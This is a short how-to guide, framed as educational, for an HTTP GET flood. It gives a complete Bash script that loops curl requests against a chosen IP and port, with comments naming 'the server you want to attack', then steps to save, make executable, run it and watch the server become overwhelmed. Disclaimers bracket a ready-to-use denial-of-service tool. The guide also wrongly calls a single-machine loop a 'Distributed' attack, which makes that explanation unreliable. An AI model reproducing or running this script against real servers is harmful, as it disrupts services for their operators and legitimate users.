## Using the HTTP GET Request Flood Bash Script

**Disclaimer**: This guide is for educational purposes only. Unauthorized and malicious use of this script to flood requests to a server is illegal and unethical.

This guide explains how to use the provided Bash script to simulate an HTTP GET request flood. This type of activity, known as a Distributed Denial of Service (DDoS) attack, can overload a server and make it inaccessible to legitimate users.

# Prerequisites

- A Unix-like terminal (Linux or macOS)
- The curl command-line tool

# Steps

1. Access the Bash Script:

    Open a terminal on your system. You can find the terminal application in the "Applications" or "Utilities" folder.

2. Copy the Script:

    Copy the following Bash script and paste it into your terminal:

    ```bash
    #!/bin/bash

    IP_ADDRESS="127.0.0.1" # Change this to the IP address of the server you want to attack
    PORT=80 # Change this to the port number of the server you want to attack
    NUM_REQUESTS=100000 # Change this to the number of requests you want to send

    for ((i = 1; i <= $NUM_REQUESTS; i++)); do
        echo "Sending GET request $i to IP address $IP_ADDRESS"
        curl -sS "http://$IP_ADDRESS:$PORT" # -sS flag to hide the progress bar
        echo "Received response for request $i"
    done
    ```
3. Modify Script Parameters:

    Adjust the following variables in the script according to your testing environment:

    - IP_ADDRESS: Replace with the IP address of the server you want to target.
    - PORT: Replace with the port number of the server you want to target.
    - NUM_REQUESTS: Replace with the number of requests you want to send to the server.

4. Save the Script:

    Save the file with a .sh extension, such as http_flood.sh.

5. Make the Script Executable:

    In your terminal, navigate to the directory containing the script and make it executable by running:

    ```bash
    chmod +x http_flood.sh
    ```
6. Run the Script:

    Execute the script by running:
    ```bash
    ./http_flood.sh
    ```
7. Observe the Effect:

    The script will start sending HTTP GET requests to the specified server IP address and port. It will repeat this process according to the NUM_REQUESTS value you set. The server may become overwhelmed, impacting its availability.

## Warning

This guide and the provided script are for educational purposes only. Launching real Distributed Denial of Service (DDoS) attacks is illegal and unethical. Always use your knowledge responsibly and respect the security and integrity of computer systems and networks.